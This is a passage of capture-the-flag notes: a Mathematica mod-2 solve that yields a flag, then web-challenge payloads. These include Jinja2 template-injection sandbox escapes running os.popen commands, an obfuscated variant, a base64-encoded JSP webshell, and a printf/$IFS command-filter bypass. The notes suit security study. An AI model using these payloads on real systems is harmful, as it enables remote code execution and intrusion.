+b165+b37+b173+b29+b185+b19+b191+b13+b201+b5+b209+b251+b215+b245+b232==1,b106+
b90+b124+b84+b130+b78+b136+b66+b150+b56+b160+b48+b166+b38+b174+b30+b186+b20+b1
92+b14+b202+b6+b210+b252+b216+b246+b233==1,b107+b91+b125+b85+b131+b79+b137+b67
+b151+b57+b161+b49+b167+b39+b175+b31+b187+b21+b193+b15+b203+b7+b211+b253+b217+
b247+b234==0,b108+b92+b126+b86+b132+b80+b138+b68+b152+b58+b162+b50+b168+b40+b1
76+b32+b188+b22+b194+b16+b204+b8+b212+b254+b218+b248+b235==1,b109+b93+b127+b87
+b133+b81+b139+b69+b153+b59+b163+b51+b169+b41+b177+b33+b189+b23+b195+b17+b205+
b9+b213+b255+b219+b249+b236==0,b110+b94+b128+b88+b134+b82+b140+b70+b154+b60+b1
64+b52+b170+b42+b178+b34+b190+b24+b196+b18+b206+b10+b214+b0+b220+b250+b237==1,
b111+b95+b129+b89+b135+b83+b141+b71+b155+b61+b165+b53+b171+b43+b179+b35+b191+b
25+b197+b19+b207+b11+b215+b1+b221+b251+b238==1,b112+b96+b130+b90+b136+b84+b142
+b72+b156+b62+b166+b54+b172+b44+b180+b36+b192+b26+b198+b20+b208+b12+b216+b2+b2
22+b252+b239==1,b113+b97+b131+b91+b137+b85+b143+b73+b157+b63+b167+b55+b173+b45
+b181+b37+b193+b27+b199+b21+b209+b13+b217+b3+b223+b253+b240==0,b114+b98+b132+b
92+b138+b86+b144+b74+b158+b64+b168+b56+b174+b46+b182+b38+b194+b28+b200+b22+b21
0+b14+b218+b4+b224+b254+b241==1,b115+b99+b133+b93+b139+b87+b145+b75+b159+b65+b
169+b57+b175+b47+b183+b39+b195+b29+b201+b23+b211+b15+b219+b5+b225+b255+b242==0
,b116+b100+b134+b94+b140+b88+b146+b76+b160+b66+b170+b58+b176+b48+b184+b40+b196
+b30+b202+b24+b212+b16+b220+b6+b226+b0+b243==0,b117+b101+b135+b95+b141+b89+b14
7+b77+b161+b67+b171+b59+b177+b49+b185+b41+b197+b31+b203+b25+b213+b17+b221+b7+b
227+b1+b244==1,b118+b102+b136+b96+b142+b90+b148+b78+b162+b68+b172+b60+b178+b50
+b186+b42+b198+b32+b204+b26+b214+b18+b222+b8+b228+b2+b245==1,b119+b103+b137+b9
7+b143+b91+b149+b79+b163+b69+b173+b61+b179+b51+b187+b43+b199+b33+b205+b27+b215
+b19+b223+b9+b229+b3+b246==1,b120+b104+b138+b98+b144+b92+b150+b80+b164+b70+b17
4+b62+b180+b52+b188+b44+b200+b34+b206+b28+b216+b20+b224+b10+b230+b4+b247==0,b1
21+b105+b139+b99+b145+b93+b151+b81+b165+b71+b175+b63+b181+b53+b189+b45+b201+b3
5+b207+b29+b217+b21+b225+b11+b231+b5+b248==0,b122+b106+b140+b100+b146+b94+b152
+b82+b166+b72+b176+b64+b182+b54+b190+b46+b202+b36+b208+b30+b218+b22+b226+b12+b
232+b6+b249==1,b123+b107+b141+b101+b147+b95+b153+b83+b167+b73+b177+b65+b183+b5
5+b191+b47+b203+b37+b209+b31+b219+b23+b227+b13+b233+b7+b250==0,b124+b108+b142+
b102+b148+b96+b154+b84+b168+b74+b178+b66+b184+b56+b192+b48+b204+b38+b210+b32+b
220+b24+b228+b14+b234+b8+b251==1,b125+b109+b143+b103+b149+b97+b155+b85+b169+b7
5+b179+b67+b185+b57+b193+b49+b205+b39+b211+b33+b221+b25+b229+b15+b235+b9+b252=
=1,b126+b110+b144+b104+b150+b98+b156+b86+b170+b76+b180+b68+b186+b58+b194+b50+b
206+b40+b212+b34+b222+b26+b230+b16+b236+b10+b253==0,b127+b111+b145+b105+b151+b
99+b157+b87+b171+b77+b181+b69+b187+b59+b195+b51+b207+b41+b213+b35+b223+b27+b23
1+b17+b237+b11+b254==1,b128+b112+b146+b106+b152+b100+b158+b88+b172+b78+b182+b7
0+b188+b60+b196+b52+b208+b42+b214+b36+b224+b28+b232+b18+b238+b12+b255==0},
{b0,b1,b2,b3,b4,b5,b6,b7,b8,b9,b10,b11,b12,b13,b14,b15,b16,b17,b18,b19,b20,b21
,b22,b23,b24,b25,b26,b27,b28,b29,b30,b31,b32,b33,b34,b35,b36,b37,b38,b39,b40,b
41,b42,b43,b44,b45,b46,b47,b48,b49,b50,b51,b52,b53,b54,b55,b56,b57,b58,b59,b60
,b61,b62,b63,b64,b65,b66,b67,b68,b69,b70,b71,b72,b73,b74,b75,b76,b77,b78,b79,b
80,b81,b82,b83,b84,b85,b86,b87,b88,b89,b90,b91,b92,b93,b94,b95,b96,b97,b98,b99
,b100,b101,b102,b103,b104,b105,b106,b107,b108,b109,b110,b111,b112,b113,b114,b1
15,b116,b117,b118,b119,b120,b121,b122,b123,b124,b125,b126,b127,b128,b129,b130,
b131,b132,b133,b134,b135,b136,b137,b138,b139,b140,b141,b142,b143,b144,b145,b14
6,b147,b148,b149,b150,b151,b152,b153,b154,b155,b156,b157,b158,b159,b160,b161,b
162,b163,b164,b165,b166,b167,b168,b169,b170,b171,b172,b173,b174,b175,b176,b177
,b178,b179,b180,b181,b182,b183,b184,b185,b186,b187,b188,b189,b190,b191,b192,b1
93,b194,b195,b196,b197,b198,b199,b200,b201,b202,b203,b204,b205,b206,b207,b208,
b209,b210,b211,b212,b213,b214,b215,b216,b217,b218,b219,b220,b221,b222,b223,b22
4,b225,b226,b227,b228,b229,b230,b231,b232,b233,b234,b235,b236,b237,b238,b239,b
240,b241,b242,b243,b244,b245,b246,b247,b248,b249,b250,b251,b252,b253,b254,b255
}, Modulus->2]
Mathematica output:
{{b0 -> 0, b1 -> 1, b2 -> 1, b3 -> 0, b4 -> 0, b5 -> 0, b6 -> 1, 
  b7 -> 0, b8 -> 0, b9 -> 1, b10 -> 1, b11 -> 0, b12 -> 1, b13 -> 0, 
  b14 -> 0, b15 -> 0, b16 -> 0, b17 -> 1, b18 -> 0, b19 -> 1, 
  b20 -> 1, b21 -> 1, b22 -> 0, b23 -> 1, b24 -> 0, b25 -> 1, 
  b26 -> 1, b27 -> 0, b28 -> 0, b29 -> 0, b30 -> 1, b31 -> 1, 
  b32 -> 0, b33 -> 1, b34 -> 1, b35 -> 1, b36 -> 0, b37 -> 1, 
  b38 -> 1, b39 -> 1, b40 -> 0, b41 -> 1, b42 -> 0, b43 -> 1, 
  b44 -> 0, b45 -> 1, b46 -> 0, b47 -> 1, b48 -> 0, b49 -> 1, 
  b50 -> 1, b51 -> 0, b52 -> 1, b53 -> 0, b54 -> 1, b55 -> 1, 
  b56 -> 0, b57 -> 1, b58 -> 0, b59 -> 1, b60 -> 0, b61 -> 0, 
  b62 -> 0, b63 -> 1, b64 -> 0, b65 -> 1, b66 -> 0, b67 -> 1, 
  b68 -> 1, b69 -> 0, b70 -> 0, b71 -> 0, b72 -> 0, b73 -> 0, 
  b74 -> 1, b75 -> 1, b76 -> 1, b77 -> 1, b78 -> 1, b79 -> 1, 
  b80 -> 0, b81 -> 0, b82 -> 1, b83 -> 1, b84 -> 0, b85 -> 0, 
  b86 -> 0, b87 -> 0, b88 -> 0, b89 -> 1, b90 -> 1, b91 -> 0, 
  b92 -> 1, b93 -> 0, b94 -> 1, b95 -> 0, b96 -> 0, b97 -> 0, 
  b98 -> 1, b99 -> 0, b100 -> 1, b101 -> 0, b102 -> 1, b103 -> 1, 
  b104 -> 0, b105 -> 1, b106 -> 1, b107 -> 0, b108 -> 1, b109 -> 1, 
  b110 -> 1, b111 -> 1, b112 -> 0, b113 -> 0, b114 -> 1, b115 -> 0, 
  b116 -> 1, b117 -> 1, b118 -> 0, b119 -> 0, b120 -> 0, b121 -> 0, 
  b122 -> 1, b123 -> 0, b124 -> 1, b125 -> 1, b126 -> 0, b127 -> 1, 
  b128 -> 0, b129 -> 1, b130 -> 0, b131 -> 1, b132 -> 0, b133 -> 0, 
  b134 -> 1, b135 -> 0, b136 -> 0, b137 -> 1, b138 -> 1, b139 -> 0, 
  b140 -> 0, b141 -> 0, b142 -> 0, b143 -> 1, b144 -> 0, b145 -> 0, 
  b146 -> 1, b147 -> 0, b148 -> 0, b149 -> 0, b150 -> 0, b151 -> 1, 
  b152 -> 0, b153 -> 1, b154 -> 1, b155 -> 0, b156 -> 0, b157 -> 0, 
  b158 -> 1, b159 -> 0, b160 -> 0, b161 -> 0, b162 -> 1, b163 -> 0, 
  b164 -> 1, b165 -> 1, b166 -> 0, b167 -> 1, b168 -> 0, b169 -> 1, 
  b170 -> 0, b171 -> 0, b172 -> 1, b173 -> 0, b174 -> 1, b175 -> 0, 
  b176 -> 0, b177 -> 1, b178 -> 1, b179 -> 0, b180 -> 0, b181 -> 1, 
  b182 -> 0, b183 -> 1, b184 -> 0, b185 -> 1, b186 -> 1, b187 -> 1, 
  b188 -> 0, b189 -> 0, b190 -> 0, b191 -> 0, b192 -> 0, b193 -> 1, 
  b194 -> 1, b195 -> 0, b196 -> 0, b197 -> 0, b198 -> 0, b199 -> 1, 
  b200 -> 0, b201 -> 1, b202 -> 0, b203 -> 1, b204 -> 1, b205 -> 0, 
  b206 -> 1, b207 -> 1, b208 -> 0, b209 -> 1, b210 -> 0, b211 -> 0, 
  b212 -> 0, b213 -> 0, b214 -> 1, b215 -> 0, b216 -> 0, b217 -> 0, 
  b218 -> 1, b219 -> 0, b220 -> 1, b221 -> 1, b222 -> 0, b223 -> 1, 
  b224 -> 0, b225 -> 1, b226 -> 1, b227 -> 0, b228 -> 0, b229 -> 0, 
  b230 -> 0, b231 -> 1, b232 -> 0, b233 -> 0, b234 -> 1, b235 -> 0, 
  b236 -> 1, b237 -> 1, b238 -> 0, b239 -> 1, b240 -> 0, b241 -> 1, 
  b242 -> 1, b243 -> 0, b244 -> 0, b245 -> 0, b246 -> 0, b247 -> 0, 
  b248 -> 0, b249 -> 1, b250 -> 1, b251 -> 1, b252 -> 1, b253 -> 0, 
  b254 -> 0, b255 -> 1}}
Input the above string to the application and the flag will be prompted:
Web
mine1_1
mine2
>>> 
hex(0b011000100110100001011101011000110111011101010101011010110101000101011000
001111110011000001101010001010110110111100101100001011010101001001100001001000
010110001000101101010010100110010101110000011000010101101101000010001011010110
0001001011010110000001111001)
'0x62685d6377556b51583f306a2b6f2c2d526121622d4a6570615b422d612d6079'
>>> from binascii import unhexlify
>>> 
unhexlify('62685d6377556b51583f306a2b6f2c2d526121622d4a6570615b422d612d6079')
[::-1]
b'y`-a-B[apeJ-b!aR-,o+j0?XQkUwc]hb'
flag{YoU\C4n/s01Ve%f1Nite_F1e1d}
{{((1)|attr(request.values.class)|attr(request.values.mro))|attr(request.value
s.getitem)(1)|attr(request.values.subclasses)()|attr(request.values.getitem)
(59)|attr(request.values.init)|attr(request.values.globals)|attr(request.value
s.getitem)(request.values.builtins)|attr(request.values.getitem)
(request.values.eval)(request.values.command)}}
class=__class__&mro=__mro__&subclasses=__subclasses__&getitem=__getitem__&init
=__init__&globals=__globals__&builtins=__builtins__&eval=eval&command=__import
__('os').popen('id').read()
{%print(%221%22|attr(%22\x5f\x5fclass\x5f\x5f%22)|attr(%22\x5f\x5fbase\x5f\x5f
%22)|attr(%22\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%22)
()|attr(%22\x5f\x5f\x67etitem\x5f\x5f%22)
(81)|attr(%22\x5f\x5finit\x5f\x5f%22)|attr(%22\x5f\x5f\x67lobals\x5f\x5f%22)|a
ttr(%22\x5f\x5f\x67etitem\x5f\x5f%22)
(%22\x5f\x5fb\x75iltins\x5f\x5f%22)|attr(%22\x5f\x5f\x67etitem\x5f\x5f%22)
(%22eval%22)
(%22\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(\x22\x6f\x73\x22)\x2e\x70\x6f\x70
\x65\x6e(\x22\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x22)\x2e\x72\x65
\x61\x64()%22))%}
pyer
sqlmap
ssti
webshell_1
hids
unicode  bypass
PCVqYXZhLmlvLklucHV0U3RyZWFtIGlucHV0PVJ1bnRpbWUuZ2V0UnVudGltZSgpLlx1MDA2NVx1MD
A3OFx1MDA2NVx1MDA2MyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiMDIzIikpLmdldElucHV0U3RyZWFt
KCk7aW50IGxlbj0tMTtieXRlW10gYnl0ZXM9bmV3IGJ5dGVbNDA5Ml07b3V0LnByaW50KCI8cHJlPi
IpO3doaWxlICgobGVuID0gaW5wdXQucmVhZChieXRlcykpICE9IC0xKSB7b3V0LnByaW50bG4obmV3
IFN0cmluZyhieXRlcykpO291dC5wcmludCgiPC9wcmU+Iik7fSU+
$(printf "ls /")=>$(printf$IFS"\154\163\040\057")
/detect.pykillshell